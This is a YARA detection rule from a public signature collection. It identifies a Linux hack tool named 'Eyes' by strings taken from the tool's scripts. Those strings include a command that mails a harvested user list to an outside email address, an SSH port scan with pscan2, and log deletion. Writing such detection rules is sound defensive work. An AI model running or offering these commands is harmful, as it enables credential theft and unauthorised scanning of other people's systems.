import "pe"

rule SIGNATURE_BASE_Linuxhacktool_Eyes_A
{
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth (Nextron Systems)"
		id = "2b4f52d4-b438-5040-89c5-aab1df15200e"
		date = "2015-01-19"
		modified = "2023-12-05"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/yara/thor-hacktools.yar#L2869-L2887"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/LICENSE"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
		logic_hash = "a246eb907fd6525c96c911acde6b513fca68248ef8d4f8fa64039791942950ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii

	condition:
		2 of them
}
